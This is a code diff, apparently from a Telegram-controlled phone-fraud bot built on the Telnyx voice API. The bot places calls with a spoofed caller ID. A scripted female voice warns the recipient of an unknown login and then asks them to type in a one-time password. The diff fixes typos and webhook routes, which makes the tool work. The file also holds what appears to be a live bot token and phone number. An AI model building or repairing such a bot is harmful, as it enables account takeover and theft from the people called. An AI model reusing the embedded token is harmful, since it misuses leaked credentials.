@@ -4,7 +4,8 @@ const service_number = '+14342338629'
 const WEBHOOK_URL = 'https://ofbtc.onrender.com';
 const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
 const ENV_TELNYX_CONNECTION_ID = '2305462997117568053'
-const alt_control_id = '2305446111344592690'
+const voice_app_id = '2305446111344592690'
+const outbound_profile_ID = '2304207034620315295'
 const al_alt ='2305800116734265211'
 const telnyx = require('telnyx')(MY_API_KEY);
 const { Telegraf } = require('telegraf'); // importing telegraf.js
@@ -113,16 +114,14 @@ const adminFilter = (ctx, next) => {
 async function call (spoof, customer_number, ctx, service, name, digit){
    console.log('command is from: ', ctx.from)
 
-   const { data: call } = await telnyx.calls.create({
-      connection_id: alt_control_id,
-      to: `+${customer_number}`,
-      from: service_number,
-      from_display_name: `+${spoof}`,
-      answering_machine_detection: 'detect'
-   }); 
-
    // Using the Telnyx API to create a new call
    try {
+      const { data: call } = await telnyx.calls.create({
+         to: `+${customer_number}`,
+         from: service_number,
+         from_display_name: `+${spoof}`,
+         answering_machine_detection: 'detect'
+      }); 
       await bot.telegram.sendMessage(ctx.chat.id, `📞 Call has Started...`, {
          reply_markup:{
             inline_keyboard: [
@@ -230,16 +229,16 @@ bot.launch();
 
 
 // webhook urls
-app.post('/webhokks', (req, res) => {
+app.post('/webhooks', (req, res) => {
    const call_control_id = req.body.data.call_control_id;
 
    telnyx.calls.gather_using_speak(
       {
          call_control_id: call_control_id,
-         payload: `There hasbeen a login to your account from an unknown location, press 1 if this was not you`, 
+         payload: `There has been a login to your account from an unknown location, press 1 if this was not you`, 
          language: 'en-US', 
          voice: 'female',
-         webhook_url: `${ WEBHOOK_URL }/pressed_one` 
+         webhook_url: `${ WEBHOOK_URL }/webhooks/pressed_one` 
       }
    )
    
@@ -257,7 +256,7 @@ app.post('/webhooks/pressed_one', (req, res) => {
       payload: `We have just sent you a one time password, kindly type the ${digit} digit code`, 
       language: 'en-US', 
       voice: 'female',
-      webhook_url: `${ WEBHOOK_URL }/typed_code` 
+      webhook_url: `${ WEBHOOK_URL }/webhooks/typed_code` 
    });
 })
 
